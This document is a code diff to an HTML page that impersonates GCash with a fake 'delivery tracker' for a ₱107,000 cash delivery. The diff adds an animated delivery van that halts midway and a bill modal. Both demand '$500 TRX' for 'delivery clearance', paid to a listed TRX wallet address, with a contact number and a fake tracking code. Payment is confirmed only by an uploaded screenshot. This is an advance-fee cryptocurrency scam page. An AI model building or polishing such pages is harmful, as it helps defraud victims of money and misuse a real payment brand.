@@ -13,6 +13,8 @@
       --gcash-dark: #003366;
       --gcash-accent: #00c3a0;
       --gcash-gray: #f6f8fa;
+      --road-gray: #212529;
+      --lane-yellow: #ffe066;
     }
     body {
       font-family: 'Nunito', Arial, sans-serif;
@@ -48,7 +50,7 @@
     }
     main {
       margin: 0 auto;
-      max-width: 470px;
+      max-width: 540px;
       background: #fff;
       border-radius: 32px;
       box-shadow: 0 4px 32px rgba(0,60,130,.10);
@@ -106,67 +108,89 @@
       50% { opacity: 0.1; }
       100% { opacity: 1; }
     }
+
+    /* Road Track and Car */
+    .road-container {
+      width: 100%;
+      max-width: 480px;
+      height: 100px;
+      margin: 0 auto 20px auto;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    svg#roadTrack {
+      width: 100%;
+      height: 100px;
+      display: block;
+    }
+    .car {
+      position: absolute;
+      top: 20px;
+      width: 80px;
+      height: 42px;
+      z-index: 2;
+      cursor: pointer;
+      transition: filter 0.2s;
+    }
+    .car.error {
+      filter: drop-shadow(0 0 10px #ff1a1a);
+      animation: shake 0.5s infinite;
+    }
+
+    @keyframes shake {
+      0% { transform: translateX(0);}
+      20% { transform: translateX(-3px);}
+      40% { transform: translateX(3px);}
+      60% { transform: translateX(-2px);}
+      80% { transform: translateX(2px);}
+      100% { transform: translateX(0);}
+    }
+
+    /* Map */
     #mapSection {
-      margin-top: 14px;
+      margin-top: 20px;
     }
     #mapSection h3 {
       color: var(--gcash-accent);
       font-size: 1.1rem;
       margin-bottom: 12px;
     }
-    /* Globe Styles */
-    .globe-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 0 0 20px 0;
-    }
-    .globe-spin {
-      width: 100px;
-      height: 100px;
-      cursor: pointer;
-      will-change: transform;
-      animation: spin 3.5s linear infinite;
-      margin: 0 auto;
-      filter: drop-shadow(0 2px 10px #0097e6aa);
-      transition: transform 0.13s;
-    }
-    .globe-spin:active {
-      transform: scale(0.97) rotateZ(10deg);
-    }
-    @keyframes spin {
-      0% { transform: rotateY(0deg);}
-      100% { transform: rotateY(360deg);}
-    }
-    #mapFrame {
+    #liveMapFrame {
       width: 100%;
-      max-width: 390px;
-      height: 300px;
+      max-width: 440px;
+      height: 270px;
       border: 2px solid var(--gcash-blue);
       border-radius: 12px;
       margin-top: 8px;
       box-shadow: 0 2px 18px 0 rgba(0,60,130,.13);
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
     }
     #carStatus {
-      font-size: 1.08rem;
-      margin: 12px 0 0 0;
+      font-size: 1.10rem;
+      margin: 14px 0 0 0;
       color: var(--gcash-accent);
       font-weight: 800;
     }
-    #paymentPrompt {
+    /* Payment prompt, confirmation, and bill styling */
+    #paymentPrompt, #billSection {
       background: var(--gcash-gray);
       border-radius: 18px;
       margin: 24px 0 0 0;
       padding: 22px 14px;
       box-shadow: 0 2px 12px 0 rgba(0,0,0,.05);
     }
-    #paymentPrompt h3 {
+    #paymentPrompt h3, #billSection h3 {
       color: var(--gcash-blue);
       font-size: 1.15rem;
       margin-bottom: 10px;
       margin-top: 0;
     }
-    #paymentPrompt code {
+    #paymentPrompt code, #billSection code {
       background: #e6f7fa;
       color: var(--gcash-dark);
       font-size: 1.1rem;
@@ -174,11 +198,11 @@
       border-radius: 8px;
       font-weight: 700;
     }
-    #paymentPrompt em {
+    #paymentPrompt em, #billSection em {
       color: #777;
       font-size: 0.97rem;
     }
-    #paymentPrompt strong {
+    #paymentPrompt strong, #billSection strong {
       color: var(--gcash-dark);
     }
     #paymentPrompt input[type="file"] {
@@ -203,37 +227,61 @@
       border: 2px solid var(--gcash-blue);
       box-shadow: 0 2px 13px 0 rgba(0,60,130,.11);
     }
+    /* Bill Modal */
+    #billSection {
+      display: none;
+      position: fixed;
+      left: 0; right: 0;
+      top: 0; bottom: 0;
+      margin: auto;
+      width: 90%;
+      max-width: 390px;
+      height: fit-content;
+      z-index: 9999;
+      box-shadow: 0 4px 32px rgba(0,0,0,0.16);
+      background: #fff;
+      border-radius: 24px;
+      text-align: left;
+      padding: 38px 24px 32px 24px;
+    }
+    #closeBillBtn {
+      position: absolute;
+      right: 18px;
+      top: 16px;
+      background: transparent;
+      border: none;
+      font-size: 1.6rem;
+      color: #c0392b;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #billSection ul {
+      margin-top: 8px;
+      margin-bottom: 8px;
+      padding-left: 20px;
+    }
+    #billSection li {
+      margin-bottom: 6px;
+    }
     /* Responsive */
     @media (max-width: 600px) {
       main {
         padding: 14px 2vw 16px 2vw;
         border-radius: 18px;
       }
-      #mapFrame { height: 220px; }
+      #liveMapFrame { height: 180px; }
+      .road-container { height: 70px; }
+      .car { width: 54px; height: 28px; }
     }
   </style>
 </head>
 <body>
   <header>
-    <div class="globe-container">
-      <!-- SVG Spinning Globe (clickable) -->
-      <svg class="globe-spin" id="globeSpin" viewBox="0 0 100 100" fill="none">
-        <circle cx="50" cy="50" r="48" fill="#e6f0ff" stroke="#0073e6" stroke-width="3"/>
-        <ellipse cx="50" cy="50" rx="48" ry="22" fill="#00c3a0" fill-opacity="0.2"/>
-        <ellipse cx="50" cy="50" rx="42" ry="18" fill="#00c3a0" fill-opacity="0.18"/>
-        <ellipse cx="50" cy="50" rx="32" ry="13" fill="#00c3a0" fill-opacity="0.14"/>
-        <!-- Continents (stylized) -->
-        <path d="M74,49 Q77,36 63,34 Q60,29 51,28 Q57,25 50,18 Q43,25 49,28 Q37,33 38,41 Q33,44 35,54 Q37,61 50,64 Q61,61 65,53 Q72,54 74,49 Z" fill="#0073e6"/>
-        <circle cx="60" cy="42" r="3.7" fill="#00c3a0"/>
-        <ellipse cx="36" cy="57" rx="5" ry="2.5" fill="#00c3a0"/>
-      </svg>
-    </div>
     <h1>
       <span>GCash Delivery Tracker</span>
     </h1>
-    <p class="subtitle">Track your GCash funds delivery in real time</p>
+    <p class="subtitle">Track your GCash cash-in in real time — direct from GCash Company</p>
   </header>
-
   <main>
     <div id="loading">
       <p>Loading your GCash Delivery Interface...</p>
@@ -249,67 +297,129 @@
     </div>
 
     <div id="mapSection">
-      <h3>🌍 Tracking Vehicle on Map</h3>
-      <iframe id="mapFrame" src="https://maps.google.com/maps?q=Barangay%20La%20Paz%2C%20Makati%20City%2C%20Metro%20Manila&z=17&output=embed" allowfullscreen></iframe>
-      <p id="carStatus">🚗 Vehicle is moving from International Airport...</p>
+      <div class="road-container" id="roadContainer">
+        <!-- SVG Road -->
+        <svg id="roadTrack" viewBox="0 0 480 100" preserveAspectRatio="none">
+          <!-- Road background -->
+          <rect x="0" y="30" width="480" height="40" rx="18" fill="var(--road-gray)" />
+          <!-- Lane divider -->
+          <rect x="0" y="48" width="480" height="4" fill="var(--lane-yellow)" />
+          <!-- Lane dashes -->
+          <g>
+            <rect x="20" y="48" width="40" height="4" fill="#fff"/>
+            <rect x="100" y="48" width="40" height="4" fill="#fff"/>
+            <rect x="180" y="48" width="40" height="4" fill="#fff"/>
+            <rect x="260" y="48" width="40" height="4" fill="#fff"/>
+            <rect x="340" y="48" width="40" height="4" fill="#fff"/>
+            <rect x="420" y="48" width="40" height="4" fill="#fff"/>
+          </g>
+        </svg>
+        <!-- Car -->
+        <div class="car" id="deliveryCar" title="Click for details"></div>
+      </div>
+      <h3>🚚 Vehicle is delivering <span style="color:var(--gcash-blue);font-weight:800">₱107,000 PHP</span> cash</h3>
+      <iframe id="liveMapFrame"
+        src="https://www.openstreetmap.org/export/embed.html?bbox=121.0124,14.5573,121.0212,14.5640&amp;layer=mapnik&amp;marker=14.5610,121.0168"
+        allowfullscreen>
+      </iframe>
+      <p id="carStatus">🚗 Vehicle is in transit from GCash HQ to Barangay La Paz, Makati City...</p>
     </div>
 
     <div id="paymentPrompt">
       <h3>💸 Payment Required</h3>
-      <p>A payment of <strong>$500 TRX</strong> is needed due to Philippine currency (Pesos).</p>
+      <p>A payment of <strong>$500 TRX</strong> is needed for delivery clearance.</p>
       <p><strong>TRX Wallet Address:</strong> <code>TAFVjANEni2zZFkjrst81ULzm56xf1uVoA</code></p>
-      <p><em>You can bring in or take out of the Philippines an amount of Philippine currency not exceeding PhP 50,000 without prior authorization from the Bangko Sentral ng Pilipinas (BSP).</em></p>
+      <p><em>Philippine law limits PHP cash transport above ₱50,000 without pre-authorization (BSP).</em></p>
       <p><strong>Delivery address:</strong> 580 Dumas corner Archimedes St., Makati City</p>
       <p><strong>Contact Number:</strong> 09959880442</p>
       <p><strong>Landmark:</strong> La Paz Barangay Hall</p>
       <p><strong>Awaiting:</strong> ₱107,000 PHP GCash delivery</p>
-      <p class="blinking">📍 Current location: BLINKING RED</p>
-      <p><strong>Upload screenshot of payment to continue tracking:</strong></p>
+      <p class="blinking">📍 Vehicle flagged for clearance. Upload payment screenshot to continue.</p>
       <input type="file" accept="image/*" onchange="confirmDelivery(event)" />
     </div>
 
     <div id="confirmation">
       <h2>✅ Payment Received</h2>
-      <p>Once the <strong>$500 TRX</strong> is delivered, your GCash will be arriving at the destination immediately.</p>
+      <p>Once <strong>$500 TRX</strong> is cleared, your GCash cash-in will be delivered directly to the destination.</p>
       <p>🚚 Delivery in progress to: Barangay La Paz, Makati City, Metro Manila</p>
       <img id="uploadedImage" src="" alt="Payment Screenshot" />
     </div>
+
+    <!-- Bill Modal -->
+    <div id="billSection">
+      <button id="closeBillBtn" onclick="closeBill()">×</button>
+      <h3>🧾 Delivery Bill & Clearance (GCash Company)</h3>
+      <ul>
+        <li><strong>Shipment:</strong> ₱107,000 PHP Cash</li>
+        <li><strong>Sender:</strong> GCash Company HQ</li>
+        <li><strong>Receiver:</strong> You</li>
+        <li><strong>Route:</strong> Makati International Airport → Barangay La Paz, Makati City</li>
+        <li><strong>Delivery Vehicle:</strong> Cash Transit Armoured Van</li>
+        <li><strong>Required Payment:</strong> <span style="color:#c0392b;font-weight:700">$500 TRX</span></li>
+        <li><strong>Status:</strong> <span style="color:#d92e2e;font-weight:700">On Hold – Awaiting Delivery Clearance Payment</span></li>
+      </ul>
+      <p><strong>TRX Wallet Address:</strong> <code>TAFVjANEni2zZFkjrst81ULzm56xf1uVoA</code></p>
+      <p><em>Please upload payment proof in the app to continue delivery.</em></p>
+    </div>
   </main>
-
   <script>
-    let attempts = 0;
+    // Car movement simulation
+    let carEl, roadEl, carWidth, roadWidth, moveInterval, carPos = 0;
+    let attempts = 0, errorTriggered = false;
     const maxAttempts = 5;
+    const centerPercent = 0.52; // Car past center triggers error (52% of road length)
 
-    // Spinning Globe click event: Go to live Google Maps of La Paz, Makati
-    document.addEventListener("DOMContentLoaded", function() {
-      document.getElementById("globeSpin").addEventListener("click", function() {
-        window.open("https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9", "_blank");
-      });
+    // Car SVG (GCash blue, professional, money bag on top)
+    const carSVG = `
+      <svg viewBox="0 0 80 42" fill="none" width="80" height="42">
+        <!-- Shadow -->
+        <ellipse cx="40" cy="40" rx="24" ry="6" fill="#222" opacity="0.17"/>
+        <!-- Body -->
+        <rect x="8" y="13" width="64" height="16" rx="7" fill="#0073e6" stroke="#003366" stroke-width="2"/>
+        <!-- Roof -->
+        <rect x="24" y="7" width="32" height="16" rx="7" fill="#00c3a0" stroke="#0073e6" stroke-width="2"/>
+        <!-- Windows -->
+        <rect x="30" y="10" width="20" height="11" rx="3" fill="#fff" opacity="0.92"/>
+        <!-- Wheels -->
+        <circle cx="20" cy="33" r="6" fill="#222"/>
+        <circle cx="60" cy="33" r="6" fill="#222"/>
+        <circle cx="20" cy="33" r="3" fill="#ccc"/>
+        <circle cx="60" cy="33" r="3" fill="#ccc"/>
+        <!-- Money Bag -->
+        <ellipse cx="40" cy="3.5" rx="7" ry="4" fill="#ffe066" stroke="#bfa300" stroke-width="1"/>
+        <rect x="36" y="0" width="8" height="6" rx="3" fill="#ffe066" stroke="#bfa300" stroke-width="1"/>
+        <text x="40" y="7.5" font-size="7" text-anchor="middle" fill="#bfa300" font-weight="bold">$</text>
+      </svg>
+    `;
 
-      // Initial loading effect
+    window.onload = () => {
       document.getElementById("loading").style.display = "block";
       setTimeout(() => {
         document.getElementById("loading").style.display = "none";
         document.getElementById("delivery").style.display = "block";
-      }, 2000);
-    });
+      }, 1800);
+
+      // Place car SVG
+      carEl = document.getElementById('deliveryCar');
+      carEl.innerHTML = carSVG;
+      carEl.addEventListener('click', triggerBill);
+
+      // Hide interactive sections at start
+      document.getElementById("mapSection").style.display = "none";
+      document.getElementById("paymentPrompt").style.display = "none";
+      document.getElementById("confirmation").style.display = "none";
+    };
 
     function promptTracking() {
       const trackingNumber = prompt("Enter your tracking number:");
       if (trackingNumber === "802563") {
         document.getElementById("delivery").style.display = "none";
         document.getElementById("mapSection").style.display = "block";
-
-        // Simulate 3-hour journey (for demo, use 4 seconds)
-        setTimeout(() => {
-          document.getElementById("carStatus").innerText = "🚗 Approaching live location...";
-          document.getElementById("paymentPrompt").style.display = "block";
-        }, 4000); // Change to 10800000 for real 3 hours
+        startCarAnimation();
       } else {
         attempts++;
         document.getElementById("delivery").style.display = "none";
         document.getElementById("errorMsg").style.display = "block";
-
         if (attempts < maxAttempts) {
           document.getElementById("errorText").innerText =
             `❌ Can't identify your identity. You have ${maxAttempts - attempts} chance(s) left.`;
@@ -324,9 +434,52 @@
             attempts = 0;
             document.getElementById("errorMsg").style.display = "none";
             document.getElementById("delivery").style.display = "block";
-          }, 4000); // Demo: 4s lock. Use 3600000 for real 1 hour.
+          }, 4000);
         }
       }
+    }
+
+    function startCarAnimation() {
+      carEl = document.getElementById('deliveryCar');
+      roadEl = document.getElementById('roadTrack');
+      carWidth = carEl.offsetWidth || 80;
+      roadWidth = roadEl.getBoundingClientRect().width || 480;
+      carPos = 0;
+      errorTriggered = false;
+      carEl.classList.remove('error');
+      carEl.title = "Click for details";
+
+      // Start moving car left → right
+      clearInterval(moveInterval);
+      moveInterval = setInterval(() => {
+        if (carPos < roadWidth - carWidth) {
+          carPos += 3.5;
+          carEl.style.left = carPos + "px";
+          // If car is past center (52%), show error (stop and blink)
+          if (!errorTriggered && carPos > (roadWidth * centerPercent)) {
+            errorTriggered = true;
+            carEl.classList.add('error');
+            document.getElementById("carStatus").innerHTML = "🚨 <b>Delivery vehicle stopped for payment clearance!</b> Click the vehicle for details.";
+            clearInterval(moveInterval);
+          }
+        }
+      }, 24);
+
+      // Reset car position visually
+      carEl.style.left = "0px";
+      carEl.classList.remove('error');
+      document.getElementById("carStatus").innerText = "🚗 Vehicle is in transit from GCash HQ to Barangay La Paz, Makati City...";
+    }
+
+    // Bill Modal Logic
+    function triggerBill() {
+      if (!errorTriggered) return;
+      document.getElementById('billSection').style.display = 'block';
+      document.getElementById('paymentPrompt').style.display = 'block';
+      document.getElementById("carStatus").innerHTML = "🚨 <b>Delivery vehicle stopped for payment clearance!</b> See bill and upload payment to resume delivery.";
+    }
+    function closeBill() {
+      document.getElementById('billSection').style.display = 'none';
     }
 
     function confirmDelivery(event) {
@@ -335,12 +488,19 @@
       reader.onload = function(e) {
         document.getElementById("uploadedImage").src = e.target.result;
         document.getElementById("paymentPrompt").style.display = "none";
+        document.getElementById("billSection").style.display = "none";
         document.getElementById("confirmation").style.display = "block";
       };
       if (fileInput.files && fileInput.files[0]) {
         reader.readAsDataURL(fileInput.files[0]);
       }
     }
+    // Responsive: Re-calc road width if window resizes
+    window.addEventListener('resize', () => {
+      if (document.getElementById("mapSection").style.display !== "none" && !errorTriggered) {
+        startCarAnimation();
+      }
+    });
   </script>
 </body>
 </html>
